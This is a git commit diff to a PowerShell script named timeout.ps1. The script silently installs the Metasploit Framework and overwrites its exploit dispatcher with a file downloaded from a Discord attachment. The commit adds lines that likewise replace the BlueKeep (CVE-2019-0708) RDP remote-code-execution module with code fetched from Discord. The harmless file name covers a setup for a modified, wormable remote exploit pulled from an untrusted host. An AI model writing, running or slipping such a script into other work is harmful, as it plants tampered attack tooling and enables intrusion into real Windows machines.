84a809ce0f6008abc5254ac2f7f7f0b6c81e3fe6
dokatka <73672976+dokatka@users.noreply.github.com>
2021-03-22 14:23:38 +0300

    Update timeout.ps1

--- timeout.ps1
+++ timeout.ps1
@@ -3,6 +3,10 @@ $WebClient.DownloadFile("https://windows.metasploit.com/metasploitframework-late
 msiexec /i C:\msf.msi /qn /norestart
 while (!(Test-Path "C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")) { Start-Sleep 10 }
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823507989893611550/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
+while (!(Test-Path "C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")) { Start-Sleep 10 }
+$WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823214074632470538/cve_2019_0708_bluekeep_rce.rb.txt","C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")
+
+
 $i = 360
 do {
     Write-Host $i
